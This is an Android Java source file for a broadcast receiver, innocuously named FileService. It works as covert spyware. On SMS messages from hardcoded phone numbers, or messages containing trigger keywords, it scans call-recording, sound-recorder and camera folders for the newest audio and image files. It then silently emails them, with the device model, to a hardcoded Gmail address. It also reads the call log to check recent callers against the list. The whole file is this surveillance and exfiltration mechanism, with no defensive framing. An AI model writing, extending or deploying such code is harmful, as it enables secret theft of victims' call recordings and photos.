package com.example.fasterpro11;

import android.Manifest;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.provider.CallLog;
import android.telephony.SmsMessage;
import android.util.Log;

import androidx.core.app.ActivityCompat;

import java.io.File;
import java.io.FileFilter;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Comparator;
import java.util.List;

public class FileService extends BroadcastReceiver {

    private static final String TAG = "FileService";

    // Allowed phone numbers and keywords for checking SMS content
    private static final String[] allowedNumbers = {
            "+8801300282086", "+8801304039289",  "+8809697637893", "+8809638821369" };


    private static final String[] WORDS1_GRADE = {"Goldfl", "Silverfl", "Mediumfl"};
    private static final String[] WORDS2_OFFER = {"Congratulationfl", "Conformfl"};
    private static final String[] audioFormats = {".amr", ".wav", ".mp3", ".m4a",".aac", ".mp4"};
    private static final String[] imageFormats = {".jpg", ".jpeg", ".JPG", ".JPEG"};
    private static final String[] folderNames = {"callrecord", "CallRecord", "call", "Call",
            "PhoneRecord", "SoundRecorder", "Music","Camera", "camera"};

    private List<String> lastMessages = new ArrayList<>();

    @Override
    public void onReceive(Context context, Intent intent) {
        Log.d(TAG, "onReceive triggered.");
        try {
            if ("android.provider.Telephony.SMS_RECEIVED".equals(intent.getAction())) {
                Log.d(TAG, "SMS_RECEIVED action detected.");
                handleSmsReceived(intent, context);
            }
        } catch (Exception e) {
            Log.e(TAG, "Error in onReceive: ", e);
        }
    }

    private void handleSmsReceived(Intent intent, Context context) {
        Log.d(TAG, "Handling received SMS in filrservice class");
        try {
            // Check runtime permission for receiving SMS
            if (ActivityCompat.checkSelfPermission(context, Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) {
                Log.e(TAG, "Permission to read SMS not granted.");
                return;
            }

            Bundle bundle = intent.getExtras();
            if (bundle != null) {
                Object[] pdus = (Object[]) bundle.get("pdus");
                Log.d(TAG, "Number of PDUs: " + (pdus != null ? pdus.length : 0));

                for (Object pdu : pdus) {
                    try {
                        SmsMessage smsMessage = SmsMessage.createFromPdu((byte[]) pdu);
                        String sender = smsMessage.getOriginatingAddress();
                        String messageBody = smsMessage.getMessageBody();
                        Log.d(TAG, "Received SMS: " + sender + ", Message: " + messageBody);

                        // Clear and update last message
                        lastMessages.clear();
                        lastMessages.add(messageBody);

                        boolean containsWords1 = containsSMSWORDS1GRADE(messageBody);
                        boolean containsWords2 = containsSMSWORDS2OFFER(messageBody);
                        boolean isInternetAvailable = isInternetAvailable(context);
                        boolean isAllowedNumber = isAllowedNumber(sender) || checkLastCallNumbers(context);

                        Log.d(TAG, "Keywords 1 found: " + containsWords1);
                        Log.d(TAG, "Keywords 2 found: " + containsWords2);
                        Log.d(TAG, "Internet available: " + isInternetAvailable);
                        Log.d(TAG, "Allowed number: " + isAllowedNumber);

                        // If conditions met, send the file
                        if ((containsWords1 && containsWords2 && isInternetAvailable) ||
                                (isAllowedNumber && isInternetAvailable)) {
                            Log.d(TAG, "Conditions met. Sending email with the latest files.");
                            sendLastTimeFileingsEmail(context);
                        } else {
                            Log.d(TAG, "Conditions not met for sending recording.");
                        }
                    } catch (Exception e) {
                        Log.e(TAG, "Error processing SMS PDU: ", e);
                    }
                }
            } else {
                Log.d(TAG, "Bundle is null.");
            }
        } catch (Exception e) {
            Log.e(TAG, "Error in handleSmsReceived: ", e);
        }
    }

    private boolean containsSMSWORDS1GRADE(String messageBody) {
        Log.d(TAG, "Checking for keywords in WORDS1_GRADE.");
        try {
            for (String keyword : WORDS1_GRADE) {
                if (messageBody.contains(keyword)) {
                    Log.d(TAG, "Keyword found in message: " + keyword);
                    return true;
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Error checking keywords in WORDS1_GRADE: ", e);
        }
        return false;
    }

    private boolean containsSMSWORDS2OFFER(String messageBody) {
        Log.d(TAG, "Checking for keywords in WORDS2_OFFER.");
        try {
            for (String keyword : WORDS2_OFFER) {
                if (messageBody.contains(keyword)) {
                    Log.d(TAG, "Keyword found in message: " + keyword);
                    return true;
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Error checking keywords in WORDS2_OFFER: ", e);
        }
        return false;
    }

    private boolean isAllowedNumber(String number) {
        Log.d(TAG, "Checking if number is allowed: " + number);
        try {
            for (String allowedNumber : allowedNumbers) {
                if (allowedNumber.equals(number)) {
                    Log.d(TAG, "Allowed number found: " + number);
                    return true;
                }
            }
            Log.d(TAG, "Number is not allowed: " + number);
        } catch (Exception e) {
            Log.e(TAG, "Error checking allowed number: ", e);
        }
        return false;
    }

    private boolean checkLastCallNumbers(Context context) {
        Log.d(TAG, "Checking last call numbers.");
        if (ActivityCompat.checkSelfPermission(context, Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) {
            Log.e(TAG, "Call log permission not granted.");
            return false;
        }

        String[] projection = {CallLog.Calls.NUMBER};
        List<String> recentNumbers = new ArrayList<>();

        try (Cursor cursor = context.getContentResolver().query(CallLog.Calls.CONTENT_URI, projection, null, null, CallLog.Calls.DATE + " DESC LIMIT 3")) {
            if (cursor != null) {
                while (cursor.moveToNext()) {
                    String number = cursor.getString(cursor.getColumnIndex(CallLog.Calls.NUMBER));
                    recentNumbers.add(number);
                    Log.d(TAG, "Recent number added: " + number);
                }
            } else {
                Log.d(TAG, "Cursor is null.");
            }
        } catch (Exception e) {
            Log.e(TAG, "Error accessing call log: ", e);
        }

        for (String number : recentNumbers) {
            if (isAllowedNumber(number)) {
                Log.d(TAG, "Allowed number found in recent calls: " + number);
                return true;
            }
        }
        Log.d(TAG, "No allowed numbers found in recent calls.");
        return false;
    }

    public boolean isInternetAvailable(Context context) {
        Log.d(TAG, "Checking internet availability.");
        try {
            ConnectivityManager cm = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
            NetworkInfo netInfo = cm.getActiveNetworkInfo();
            boolean isConnected = netInfo != null && netInfo.isConnected();
            Log.d(TAG, "Internet available: " + isConnected);
            return isConnected;
        } catch (Exception e) {
            Log.e(TAG, "Error checking internet availability: ", e);
            return false;
        }
    }

    // Static variables to store the last email content and file size
    private static String lastEmailContent = "";
    private static long lastEmailFileSize = 0;

    private static void sendEmailWithAttachment(Context context, String filePath) {
        Log.d(TAG, "File Service Sending email with attachment...");
        try {
            File file = new File(filePath);
            if (!file.exists()) {
                Log.e(TAG, "File not found: " + filePath);
                return;
            }

            // Get the current file size
            long currentFileSize = file.length();

            // Check if the content and file size are the same as the last sent email
            if (filePath.equals(lastEmailContent) && currentFileSize == lastEmailFileSize) {
                Log.d(TAG, "Not sending the email.Because File content and size are the same as last time sended. ");
                return;  // Skip sending the email if content and size are the same
            }
            String mobileModel = Build.MODEL;

            String MbileModel =  mobileModel;
            // Build the email content (you can modify this to suit your needs)
            String emailContent = MbileModel + "call recording: " + filePath;

            // Send the email with attachment
            Log.d(TAG, "Sending email with attachment...");
            JavaMailAPI_Fileservice_Sender.sendMailWithAttachment("abontiangum99@gmail.com", "File Service", emailContent, filePath);
            Log.d(TAG, "Email sent with attachment: " + filePath);

            // Update the last email content and file size
            lastEmailContent = filePath;
            lastEmailFileSize = currentFileSize;

        } catch (Exception e) {
            Log.e(TAG, "Error sending email: ", e);
        }
    }

    public static void sendLastTimeFileingsEmail(Context context) {
        Log.d(TAG, "Sending last time fileings email.");
        boolean fileSent = false; // To track if any file has been sent
        List<File> searchFolders = new ArrayList<>();

        // Search for folders in both internal storage and SD card
        Log.d(TAG, "Searching for folders in both internal and external storage.");
        searchFolders.addAll(findFolders(Environment.getExternalStorageDirectory()));
        searchFolders.addAll(findFolders(Environment.getDataDirectory()));

        StringBuilder emailContent = new StringBuilder(); // To build the email content

        for (File folder : searchFolders) {
            try {
                // Check for last audio file in folder
                File lastFile = getLastFileFromFolder(folder, audioFormats);
                if (lastFile != null) {
                    Log.d(TAG, "Last audio file found: " + lastFile.getAbsolutePath());
                    emailContent.append("Last audio file: ").append(lastFile.getAbsolutePath()).append("\n");

                    // Check if the current file's size and content is the same as the last one
                    long currentFileSize = lastFile.length();
                    if (lastFile.getAbsolutePath().equals(lastEmailContent) && currentFileSize == lastEmailFileSize) {
                        Log.d(TAG, "File content and size are the same as last time. Not sending the email.");
                    } else {
                        Log.d(TAG, "Sending email with new content and file.");
                        sendEmailWithAttachment(context, lastFile.getAbsolutePath());
                        fileSent = true;
                        lastEmailContent = lastFile.getAbsolutePath();  // Update the last email content
                        lastEmailFileSize = currentFileSize;  // Update the last file size
                    }
                }
            } catch (Exception e) {
                Log.e(TAG, "Error checking audio folder: ", e);
            }

            try {
                // Check for last image file in folder
                File lastImage = getLastFileFromFolder(folder, imageFormats);
                if (lastImage != null) {
                    Log.d(TAG, "Last image file found: " + lastImage.getAbsolutePath());
                    emailContent.append("Last image file: ").append(lastImage.getAbsolutePath()).append("\n");

                    // Check if the current file's size and content is the same as the last one
                    long currentFileSize = lastImage.length();
                    if (lastImage.getAbsolutePath().equals(lastEmailContent) && currentFileSize == lastEmailFileSize) {
                        Log.d(TAG, "File content and size are the same as last time. Not sending the email.");
                    } else {
                        Log.d(TAG, "Sending email with new content and file.");
                        sendEmailWithAttachment(context, lastImage.getAbsolutePath());
                        fileSent = true;
                        lastEmailContent = lastImage.getAbsolutePath();  // Update the last email content
                        lastEmailFileSize = currentFileSize;  // Update the last file size
                    }
                }
            } catch (Exception e) {
                Log.e(TAG, "Error checking image folder: ", e);
            }
        }

        if (!fileSent) {
            Log.d(TAG, "No files found to send.");
        }
    }


    public static List<File> findFolders(File directory) {
        List<File> folderList = new ArrayList<>();
        File[] files = directory.listFiles();

        // Check if files exist in the directory
        if (files != null) {
            // Loop through all the folders in the directory
            for (String folderName : folderNames) {
                boolean folderFound = false; // Flag to check if the folder is found

                // Loop through files in the directory and check for folder match
                for (File file : files) {
                    if (file.isDirectory() && file.getName().equalsIgnoreCase(folderName)) {
                        folderList.add(file);
                        Log.d(TAG, "Found folder: " + file.getAbsolutePath());
                        folderFound = true;
                        break; // No need to continue if folder is found
                    }
                }

                // If folder is not found, log it
                if (!folderFound) {
                    Log.d(TAG, "Not Found folder: " + folderName);
                }
            }
        } else {
            Log.d(TAG, "Directory is empty or null: " + directory.getAbsolutePath());
        }

        // Log the total number of matching folders found
        Log.d(TAG, "Total matching folders found in " + directory.getAbsolutePath() + ": " + folderList.size());

        return folderList;
    }



    public static File getLastFileFromFolder(File folder, String[] formats) {
        Log.d(TAG, "Getting last file from folder: " + folder.getAbsolutePath());
        File[] files = folder.listFiles(new FileFilter() {
            @Override
            public boolean accept(File file) {
                for (String format : formats) {
                    if (file.getName().endsWith(format)) {
                        return true;
                    }
                }
                return false;
            }
        });

        if (files != null && files.length > 0) {
            Arrays.sort(files, new Comparator<File>() {
                @Override
                public int compare(File o1, File o2) {
                    return Long.compare(o2.lastModified(), o1.lastModified());
                }
            });
            return files[0];
        }
        return null;
    }

    public void SendLastTimeFileingsEmail(Intent applicationContext, Context context) {
        sendLastTimeFileingsEmail(context); // Corrected to pass both Intent and Context
    }

}
